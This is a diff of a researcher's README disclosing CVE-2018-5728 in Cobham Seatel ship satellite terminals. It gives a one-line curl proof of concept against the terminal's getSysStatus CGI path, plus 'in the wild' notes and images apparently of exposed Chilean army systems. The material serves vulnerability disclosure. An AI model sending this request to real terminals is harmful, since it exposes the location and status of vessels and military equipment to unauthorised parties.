@@ -1,9 +1,10 @@
-# seatel_terminals
+# Terminales Seatel 
 Las embarcaciones que ocupan la plataforma satelital Seatel (de la firma Cobham), cuenta con una serie de vulnerabilidades sobre los servicios de la misma terminal, que podría permitir fácilmente a terceros no autorizados entre otras cosas conocer su geolocalización.
 
+![seatel_home](img/Radomos.jpg) 
 
 
-#  [Tool] show DVR Credentiales
+#  [Exploit] show DVR Credentiales
 
 	[*] Exploit Title:      "Sensitive exposure from Seatel satellite terminal" 
 	[*] CVE:                 CVE-2018-5728
@@ -12,12 +13,11 @@ Las embarcaciones que ocupan la plataforma satelital Seatel (de la firma Cobham)
 	[*] Exploit Author:      Fernandez Ezequiel ( twitter:@capitan_alfa )
 
 	
-![seatel_home](img/home_sat.png) 
 
-### Exploit:
+### Simple PoC:
 
 ```
-	$> curl "http://<dvr_host>:<port>//cgi-bin/getSysStatus"
+	$> curl "http://<dvr_host>:<port>/cgi-bin/getSysStatus"
 
 ```
 ## In the Wild:
@@ -50,6 +50,11 @@ Las embarcaciones que ocupan la plataforma satelital Seatel (de la firma Cobham)
 ## Pocs (Output) :
 ![seatel_poc_4](img/poc_tool_1.png)
 ![seatel_poc_4](img/poc_tool_2.png)
+
+
+### Extra: CHILE ARMY !!!
+![chile_army](img/2.jpeg)
+![chile_army](img/4.jpeg)
 
 
 ### Blog:
